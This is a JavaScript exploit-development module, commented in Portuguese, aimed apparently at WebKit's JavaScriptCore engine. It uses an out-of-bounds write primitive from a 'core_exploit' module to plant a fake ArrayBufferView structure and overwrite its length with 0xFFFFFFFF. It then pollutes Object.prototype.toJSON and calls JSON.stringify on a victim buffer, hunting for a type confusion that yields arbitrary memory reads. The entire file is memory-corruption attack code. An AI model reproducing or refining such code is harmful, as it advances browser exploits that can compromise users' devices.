// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v23_RevisitOriginalCrash";

// --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
const FAKE_VIEW_BASE_OFFSET_IN_OOB    = 0x58;
const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; // Placeholder
const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       // Placeholder (Uint32ArrayType)
const FAKE_VIEW_TYPEINFO_FLAGS        = 0x00;
const FAKE_VIEW_CELLINFO_INDEXINGTYPE = 0x0F;
const FAKE_VIEW_CELLINFO_STATE        = 0x01;
const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; // Placeholder problemático
const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero;
const FAKE_VIEW_MLENGTH_INITIAL_PLANT = 0x100;      // Plantar inicialmente um tamanho "seguro"
const FAKE_VIEW_MMODE_VALUE           = 0x00000000;

// --- Constantes para a Corrupção Crítica ---
const CRITICAL_OOB_WRITE_OFFSET = 0x70; // Offset no oob_array_buffer_real
const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; // Valor que causava instabilidade (sobrescreverá m_length da fake view)

// --- Marcadores para Leitura via Potencial SuperView ---
const OOB_BUFFER_MARKER_OFFSET = 0x0; 
const OOB_BUFFER_MARKER_VALUE  = 0x41424344; // 'ABCD'
const OTHER_SID_READ_OFFSET    = 0x400; 
const OTHER_SID_READ_VALUE     = 0xFEEDFACE;

let getter_probe_details = null;

// ============================================================
// FUNÇÃO toJSON Poluída para Sondar 'this'
// ============================================================
function toJSON_ProbeArrayBufferState_v23() {
    const FNAME_toJSON = "toJSON_ProbeArrayBufferState_v23";
    // Log mínimo aqui para evitar interferir com o heisenbug,
    // mas capturar informações essenciais se 'this' for corrompido.
    
    getter_probe_details = {
        toJSON_executed: FNAME_toJSON,
        this_type: "N/A",
        this_byteLength: "N/A",
        read_at_0: "N/A", // Leitura de this[0]
        read_at_fake_view_sid: "N/A", // Leitura de this[FAKE_VIEW_BASE_OFFSET_IN_OOB/4]
        read_at_other_sid: "N/A", // Leitura de this[OTHER_SID_READ_OFFSET/4]
        error: null
    };

    try {
        getter_probe_details.this_type = Object.prototype.toString.call(this);
        
        if (!(this instanceof ArrayBuffer)) {
            getter_probe_details.error = "this is not an ArrayBuffer as expected by toJSON_ProbeArrayBufferState_v23.";
            logS3(`[${FNAME_toJSON}] ${getter_probe_details.error} Type: ${getter_probe_details.this_type}`, "critical", FNAME_toJSON);
            return getter_probe_details;
        }

        getter_probe_details.this_byteLength = this.byteLength;
        // Não logar o byteLength aqui dentro para ser mais leve.

        // Se o byteLength for o valor massivo (0xFFFFFFFF) que escrevemos em 0x70,
        // isso é um sinal de que 'this' (victim_ab) pode ter sido confundido com nossa estrutura fake.
        if (this.byteLength === CRITICAL_OOB_WRITE_VALUE || this.byteLength === FAKE_VIEW_MLENGTH_INITIAL_PLANT) {
            logS3(`[${FNAME_toJSON}] 'this' (victim_ab) tem byteLength = ${toHex(this.byteLength)}. Tentando leituras...`, "vuln", FNAME_toJSON);
            document.title = `toJSON: victim_ab len=${toHex(this.byteLength)}`;
            try {
                const temp_view = new Uint32Array(this); // Criar view sobre 'this'
                getter_probe_details.read_at_0 = toHex(temp_view[OOB_BUFFER_MARKER_OFFSET / 4]);
                getter_probe_details.read_at_fake_view_sid = toHex(temp_view[FAKE_VIEW_BASE_OFFSET_IN_OOB / 4]);
                getter_probe_details.read_at_other_sid = toHex(temp_view[OTHER_SID_READ_OFFSET / 4]);
            } catch (e_read) {
                getter_probe_details.error = `Error reading elements from 'this': ${e_read.message}`;
                logS3(`[${FNAME_toJSON}] Erro ao ler elementos de 'this': ${e_read.message}`, "error", FNAME_toJSON);
            }
        }
    } catch (e_main) {
        getter_probe_details.error = `General error in toJSON: ${e_main.name} - ${e_main.message}`;
        // Não logar daqui para evitar TypeError se o logS3 for o problema
        // logS3(`[${FNAME_toJSON}] Erro geral no getter: ${e_main.message}`, "critical", FNAME_toJSON);
    }
    return getter_probe_details;
}

// ============================================================
// FUNÇÃO PRINCIPAL (v23_RevisitOriginalCrash)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.revisitOriginalCrashConditions`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Revisitando Condições do Crash Original com Sondagem Melhorada ---`, "test", FNAME_CURRENT_TEST);
    document.title = `RevisitCrash v23 Test...`;

    getter_probe_details = null; // Resetar
    const victim_ab_size = 64;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // PASSO 1: Plantar a estrutura FALSA de ArrayBufferView em 0x58 com m_length INICIALMENTE "seguro"
        logS3(`PASSO 1: Plantando estrutura fake em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)} com m_length=${toHex(FAKE_VIEW_MLENGTH_INITIAL_PLANT)}...`, "info", FNAME_CURRENT_TEST);
        const sidOffset      = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
        const typeInfoBaseOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET;
        const bufferPtrOff   = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET;
        const mVectorOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const mLengthOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // Este é 0x70
        const mModeOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

        oob_write_absolute(sidOffset, FAKE_VIEW_STRUCTURE_ID, 4);
        oob_write_absolute(typeInfoBaseOffset + 0, FAKE_VIEW_TYPEINFO_TYPE, 1);
        oob_write_absolute(typeInfoBaseOffset + 1, FAKE_VIEW_TYPEINFO_FLAGS, 1);
        oob_write_absolute(typeInfoBaseOffset + 2, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1);
        oob_write_absolute(typeInfoBaseOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1);
        oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8); 
        oob_write_absolute(mVectorOffset, FAKE_VIEW_MVECTOR_VALUE, 8);
        oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_INITIAL_PLANT, 4); // m_length = 0x100
        oob_write_absolute(mModeOffset, FAKE_VIEW_MMODE_VALUE, 4);
        logS3(`  Estrutura fake plantada em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}.`, "good", FNAME_CURRENT_TEST);

        // Plantar marcadores no oob_array_buffer_real
        oob_write_absolute(OOB_BUFFER_MARKER_OFFSET, OOB_BUFFER_MARKER_VALUE, 4);
        logS3(`  Plantado Marcador OOB (${toHex(OOB_BUFFER_MARKER_VALUE)}) em ${toHex(OOB_BUFFER_MARKER_OFFSET)}`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(OTHER_SID_READ_OFFSET, OTHER_SID_READ_VALUE, 4);
        logS3(`  Plantado Outro Marcador (${toHex(OTHER_SID_READ_VALUE)}) em ${toHex(OTHER_SID_READ_OFFSET)}`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(50);

        // PASSO 2: Escrita OOB CRÍTICA em 0x70 (sobrescrevendo o m_length da estrutura fake para 0xFFFFFFFF)
        logS3(`PASSO 2: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(CRITICAL_OOB_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(CRITICAL_OOB_WRITE_OFFSET, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita crítica em ${toHex(CRITICAL_OOB_WRITE_OFFSET)} realizada. m_length da estrutura fake em 0x58 agora deve ser 0xFFFFFFFF.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(50);

        // PASSO 3: Criar victim_ab e tentar JSON.stringify com toJSON poluído
        let victim_ab = new ArrayBuffer(victim_ab_size);
        logS3(`PASSO 3: victim_ab (${victim_ab_size} bytes) criado. Tentando JSON.stringify(victim_ab) com toJSON_ProbeArrayBufferState_v23...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;
        let stringifyResult = null;
        let errorCaptured = null;
        let potentiallyCrashed = true;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_ProbeArrayBufferState_v23,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab)...`, "info", FNAME_CURRENT_TEST);
            stringifyResult = JSON.stringify(victim_ab); 
            potentiallyCrashed = false;
            
            logS3(`  JSON.stringify completou. Resultado (getter_probe_details): ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (stringifyResult) { // stringifyResult é o objeto retornado por toJSON_ProbeArrayBufferState_v23
                if (stringifyResult.error) {
                    logS3(`    ERRO DENTRO da toJSON: ${stringifyResult.error}`, "error", FNAME_CURRENT_TEST);
                }
                if (stringifyResult.this_byteLength === CRITICAL_OOB_WRITE_VALUE) {
                    logS3("    !!!! SUCESSO ESPECULATIVO !!!! 'this' (victim_ab) no toJSON tem byteLength IGUAL ao CRITICAL_OOB_WRITE_VALUE!", "vuln", FNAME_CURRENT_TEST);
                    logS3(`      Tentativa de leitura de this[0] (OOB_BUFFER_MARKER): ${stringifyResult.read_at_0}`, "leak", FNAME_CURRENT_TEST);
                    logS3(`      Tentativa de leitura de this[0x58/4] (FAKE_VIEW_SID): ${stringifyResult.read_at_fake_view_sid}`, "leak", FNAME_CURRENT_TEST);
                    logS3(`      Tentativa de leitura de this[0x400/4] (OTHER_SID): ${stringifyResult.read_at_other_sid}`, "leak", FNAME_CURRENT_TEST);
                    document.title = "POTENTIAL TYPE CONFUSION! victim_ab -> SuperView?";
                } else if (typeof stringifyResult.this_byteLength === 'number') {
                    logS3(`    INFO: victim_ab.byteLength (em toJSON) = ${stringifyResult.this_byteLength} (esperado ${victim_ab_size} ou ${toHex(CRITICAL_OOB_WRITE_VALUE)})`, "info", FNAME_CURRENT_TEST);
                }
            }

        } catch (e_stringify) {
            errorCaptured = e_stringify;
            potentiallyCrashed = false;
            logS3(`  ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `JSON_STRINGIFY CRASH: ${e_stringify.name}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO GERAL: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU CRITICAMENTE!`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        if (potentiallyCrashed && !errorCaptured) { // Se não houve erro capturado mas não chegou ao fim esperado
             document.title = `${FNAME_MAIN} Congelou?`;
             logS3("O TESTE PODE TER CONGELADO/CRASHADO.", "error", FNAME_CURRENT_TEST);
        } else if (!document.title.includes("SUCCESS") && !document.title.includes("POTENTIAL") && !document.title.includes("FALHOU") && !document.title.includes("CRASH") && !document.title.includes("ERR")) {
            document.title = `${FNAME_MAIN} Done`;
        }
    }
}
